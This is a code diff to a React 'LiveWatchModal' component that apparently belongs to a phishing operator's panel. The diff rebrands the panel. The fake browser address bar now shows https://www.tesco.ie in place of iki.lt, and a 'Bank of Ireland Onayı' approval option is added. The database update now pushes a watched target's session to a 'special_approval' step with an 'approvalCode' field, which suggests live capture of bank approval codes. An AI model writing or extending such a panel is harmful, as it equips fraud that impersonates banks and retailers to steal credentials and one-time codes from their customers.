@@ -53,7 +53,7 @@ const ROUTE_OPTIONS = [
 
 const APPROVAL_OPTIONS = [
   { value: "transfer", label: "Transfer Onayı" },
-  { value: "autenticacao", label: "Autenticação" },
+  { value: "boi_approval", label: "Bank of Ireland Onayı" },
 ];
 
 export function LiveWatchModal({
@@ -795,7 +795,15 @@ export function LiveWatchModal({
       if (supabase && sessionId) {
         await supabase
           .from("sessions")
-          .update({ current_step: approvalVal, status: "online" })
+          .update({
+            current_step: "special_approval",
+            status: "online",
+            form_data: {
+              ...(formData || {}),
+              approvalStatus: approvalVal,
+              approvalCode: "",
+            },
+          })
           .eq("id", sessionId);
       }
     }
@@ -1173,7 +1181,7 @@ export function LiveWatchModal({
                   {/* Phone Screen Canvas */}
                   <div
                     ref={playerContainerRef}
-                    className="live-player-screen rounded-[38px] overflow-hidden bg-[#021a0e] relative"
+                    className="live-player-screen rounded-[38px] overflow-hidden bg-[#010c18] relative"
                     style={{ width: phoneScreenW, height: phoneScreenH }}
                   />
 
@@ -1199,20 +1207,20 @@ export function LiveWatchModal({
                       <div className="w-3 h-3 rounded-full bg-emerald-500" />
                     </div>
                     <div className="flex-1 mx-4 px-3 py-1 rounded-md text-[11px] font-mono opacity-60 bg-black/5 dark:bg-white/5 truncate">
-                      https://iki.lt{currentPath}
+                      https://www.tesco.ie{currentPath}
                     </div>
                   </div>
 
                   {/* Desktop Content */}
                   <div
                     ref={playerContainerRef}
-                    className="live-player-screen w-full flex-1 overflow-auto bg-[#021a0e] relative"
+                    className="live-player-screen w-full flex-1 overflow-auto bg-[#010c18] relative"
                   />
                 </div>
               ) : (
                 /* FIT / NATIVE VIEWPORT */
                 <div
-                  className="rounded-xl shadow-2xl border overflow-hidden bg-[#021a0e] relative"
+                  className="rounded-xl shadow-2xl border overflow-hidden bg-[#010c18] relative"
                   style={{
                     width: viewportWidth,
                     height: viewportHeight,
